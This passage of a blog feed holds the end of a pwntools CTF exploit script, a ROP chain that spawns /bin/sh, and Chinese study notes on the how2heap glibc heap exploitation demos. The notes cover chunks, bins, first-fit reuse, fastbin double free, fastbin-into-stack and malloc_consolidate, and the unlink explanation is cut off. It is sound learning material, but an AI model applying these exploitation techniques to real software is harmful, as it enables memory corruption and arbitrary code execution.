punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400501</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#payload2='/bin/sh'+'\x00'+'a'*8+p64(pop6_addr)+p64(0)+p64(0)+p64(bin_addr+0x68)+p64(0)+p64(0)+p64(bin_addr)+p64(pop_rdi)+p64(bin_addr)+p64(pop_rax)+p64(rdx_addr)+p64(0x400501)</span>
<span class="token comment" spellcheck="true"># gdb.attach(sh)</span>
<span class="token comment" spellcheck="true"># pause()</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[how2heap学习笔记]]></title>
      <url>/2020/01/23/how2heap-xue-xi-bi-ji/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h2><h3 id="堆是如何分配的"><a href="#堆是如何分配的" class="headerlink" title="堆是如何分配的"></a>堆是如何分配的</h3><p>在内存中堆有两种分配方式 一种是<code>mmap</code>另外一种是<code>brk</code> 这两者的区别是</p>
<p><code>mmap</code>:是当申请的堆块size>128kb时 使用mmap分配<br><code>brk</code>:是当申请的堆块size<128kb的时候 使用brk分配 且第一次分配132kb(main arena) 第二次在brk下分配 如果不够则执行系统调用 向内核重新申请</p>
<h3 id="chunk是什么"><a href="#chunk是什么" class="headerlink" title="chunk是什么"></a>chunk是什么</h3><p>在内存中进行堆块管理的时候 系统基本是以chunk啦作为基本单位的 chunk的结构为</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> malloc_chunk <span class="token punctuation">{</span>
    INTERNAL_SIZE_T prev_size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Size of previous chunk (if free). */</span>
    INTERNAL_SIZE_T size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Size in bytes, including overhead. */</span>
    <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>
    <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* Only used for large blocks: pointer to next larger size. */</span>
    <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>
    <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<p><code>prev_size</code>:描述前一个堆块的大小 如果前一个堆块不是空闲的 则prev_size值为0<br><code>size</code>:描述本堆块的大小<br><code>fd</code>:如果本堆块是空闲的fd指针才生效 指向下一个空闲的堆块<br><code>bk</code>:如果本堆块是空闲的bk指针才生效 指向上一个空闲的堆块<br><code>fd_nextsize</code>:如果本堆块是空闲的时候fd_nextsize指针才生效 用于指向下一个堆块 只有本堆块是<code>large bin</code>才生效 其余情况为<code>null</code><br><code>bk_nextsize</code>:如果本堆块是空闲的时候bk_nextsize指针才生效 用于指向上一个堆块 只有本堆块是<code>large bin</code>才生效 其余情况为<code>null</code></p>
<blockquote>
<p><code>size</code>字段的第三位是标志位 0bit表示上一个chunk是否被free 1bit表示该chunk是否由mmap分配 2bit表示该chunk是否属于main arena</p>
</blockquote>
<p>malloc返回的地址就是指向fd字段的地址</p>
<h3 id="bin是什么"><a href="#bin是什么" class="headerlink" title="bin是什么"></a>bin是什么</h3><p>bin在内存中是用于管理<code>free</code>之后的chunk 具体来说 其实bin就是带有头结点的链表数组 根据特点分为以下几种</p>
<blockquote>
<p><code>fastbin</code>:</p>
<pre><code>  根据chunk大小维护多个单向链表 
  sizeof(chunk)<64(bytes)
  下一个chunk的free标志位不清除 即显示上一个堆块仍在使用
  具有和栈一样FILO的机制 即先被`free`的先被`malloc`
  维护有固定大小chunk的十个链表</code></pre><p><code>unsortedbin</code>:</p>
<pre><code>  双向循环链表
  不排序
  暂时存储被`free`之后的chunk 过了一段时间后会将chunk放入对应的bin中
  只有一个链表</code></pre><p><code>smallbin</code>:</p>
<pre><code>  双向循环链表
  sizeof(chunk)<512(bytes)
  具有类似于队列的FIFO机制
  共有62个链表       </code></pre><p><code>largebin</code>:</p>
<pre><code>  双向循环链表
  sizeof(chunk)>512(bytes)
  `free chunk`中多了两个指针分别指向前后的large chunk</code></pre></blockquote>
<p>虽然<code>fastbin</code>和<code>smallbin</code>的范围有重叠 但是chunk并不重复 <code>fastbin</code>主要作用是跟cache一样 提高malloc速度 unsortedbin也是一样</p>
<h2 id="how2heap学习笔记"><a href="#how2heap学习笔记" class="headerlink" title="how2heap学习笔记"></a>how2heap学习笔记</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p>这个样例主要是演示了glibc的一种分配机制 即被free之后的chunk会依据chunk大小先放到<code>unsorted bin</code>或者<code>fast bin</code>中 如果后续继续malloc 会先去这两个里去找 如果没有合适的 会将<code>unsorted bin</code>中所有的堆块 放到适合的bin中</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This can be exploited in a use-after-free situation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> c<span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(0x512): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(0x256): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"we could continue mallocing here...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"now let's put a string at a that we can read later \"this is A!\"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"this is A!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"first allocation %p points to %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, let's allocate 0x500 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(0x500): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And put a different string here, \"this is C!\"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token string">"this is C!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd allocation %p points to %s\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"first allocation %p points to %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>代码中释放了chunk a 此时chunk a在<code>unsorted bin</code>中 后续继续<code>malloc(0x500)</code>时因为在<code>unsorted bin</code>中没有合适的chunk给分配 于是<code>unsorted bin</code>将其中所有的chunk放到适合的bin中 接着重新分配 因为<code>size</code>>512所以应该去<code>large bin</code>中分配 因为glibc倾向于将刚释放的内存分配出去 所以又重新将chunk a分割后分配出去 就此用户就可以拿到两个指向同一个chunk的指针</p>
<h3 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h3><p>这个案例是讲述了一个最简单的针对<code>fast bin</code>的<code>double free</code>攻击 源码如下</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates a simple double-free attack with fastbins.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// free(a);</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>glibc 2.23对<code>double free</code>的检测非常好绕过 glibc只检测bin最上面的一个chunk是不是即将要free的chunk 如果是 那么程序就crash并报出<code>double free</code>的错误 所以程序在<code>free</code>了chunk a之后选择<code>free</code>了chunk b来绕过<code>double free</code>的检测 因为chunk a被<code>free</code>了两次 所以在<code>fast bin</code>中存储了两个chunk a 接下来三次<code>malloc</code>就会发现用户申请的第一个指针和第三个指针都指向同一个堆块</p>
<h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><blockquote>
<p>虽然这个不是第一个项目 但是是刚刚弄懂的..就赶紧记录下来了</p>
</blockquote>
<p>案例源码如下</p>
<pre class=" language-c"><code class="language-c">
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>c<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a:%p\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b:%p\n"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c:%p\n"</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size:%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free a\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free a\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    size<span class="token operator">=</span><span class="token number">0x21</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>d<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>d<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>e<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>f<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>g<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"d:%p\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"e:%p\n"</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"f:%p\n"</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"g:%p\n"</span><span class="token punctuation">,</span>g<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span></code></pre>
<p>阅读源码可以知道 首先有一个<code>double free</code>漏洞 这样在fastbin中chuck a和chuck b的fd指针都指向彼此 这样就会形成一个死循环 无论怎么重新<code>malloc</code>申请堆块 只要size一样 申请出来的都是chuck a和chuck b且交替出现</p>
<p>此时<code>double free</code>后fastbin中两个chuck的状态</p>
<p><img src="https://s2.ax1x.com/2020/01/24/1V4b7Q.png" alt="1V4b7Q.png"></p>
<p>然后将局部变量<code>size</code>的值修改为0x21也就是chuck a的size字段的值 同时重新申请chuck a然后将其fd指针覆盖为栈上的数据 因为glibc在分配内存时只会验证size字段是否符合 这样的话 如果我们继续申请堆块 那么下个堆块就应该是在栈上</p>
<p>覆盖fd指针后</p>
<p><a href="https://imgchr.com/i/1V5FAJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/24/1V5FAJ.md.png" alt="1V5FAJ.md.png"></a></p>
<blockquote>
<p>不是申请了chuck a么 为什么其fd指针仍然生效</p>
<p>这是因为在fastbin中未分配的chuck b fd指针仍然指向chuck a这样chuck a在glibc看来就仍然是未分配的堆块 如上图</p>
</blockquote>
<p>这样操作就可以通过<code>double free</code>拿到栈上一个指针 </p>
<h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p>这个样例主要是用于解释另外一种可以用于绕过<code>double free</code>检测的机制<code>malloc_consolidate()</code> 案例如下</p>
<pre class=" language-c"><code class="language-c">
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated two fastbins: p1=%p p2=%p\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now free p1!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Trigger the double free vulnerability!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We can pass the check in malloc() since p1 is not fast top.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><code>malloc_cosolidate()</code>函数在程序中主要有两个作用 第一是初始化<code>fastbin</code>和清空<code>fastbin</code> 清空<code>fastbin</code>时 首先将相同大小的chunk根据fd指针从前到后一一合并 如果在合并完之后 这个大chunk紧贴着<code>top chunk</code>那么就把这个chunk合并进<code>top chunk</code>中 如果不相邻就将这个chunk放到<code>unsorted bin</code>中 那么当触发这个机制的时候<code>fastbin</code>的所有chunk都会被清空 然后通过<code>unsorted bin</code>重新放到合适的bin中 此时<code>fastbin</code>的顶部就不是p1指针了 再<code>free(p1)</code> 此时p1指针就同时出现在了<code>fastbin</code>和<code>small bin</code>中</p>
<p><img src="https://s2.ax1x.com/2020/01/31/13hNU1.png" alt="13hNU1.png"></p>
<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><p>我吐了 这个案例卡了一周多 资料也很少能找到…要么就是一句话带过..太难了 </p>
<p>首先先解释下为什么<code>size</code>字段的低三位没有用 可以拿来做标志位 <code>这是因为 所有chunk都是八字节对齐的 注意是八字节对齐的</code> 求求写四字节对齐的大佬们改改吧…因为是八字节对齐 所以低三位是什么都无所谓 其中最重要的就是最后一位 它标志着前一个chunk是否是<code>free chunk</code></p>
<p>解释完了<code>size</code>字段低三位的问题 下面来解释下Linux中的<code>unlink</code>机制 简单来说就是 在堆中有两个<code>物理相邻的</code>的堆块chunk1 chunk2 当chunk2是<code>free chunk</code>时 进行<code>free(chunk1)</code>操作的时候就会触发<code>unlink</code>机制 <code>unlink</code>机制会将chunk1和chunk2合并为一个大的chunk 而这个操作其实就是数据结构里的双向链表删除操作..</p>
<p>这里借用CTF_WIKI的图来讲解</p>
<p><img src="https://s2.ax1x.com/2020/02/02/1Ju7i8.png" alt="1Ju7i8.png"></p>
<blockquote>
<p>FD=p->fd     BK=p->bk</p>
<p>FD->bk=BK    BK->fd=FD</p>
</blockquote>
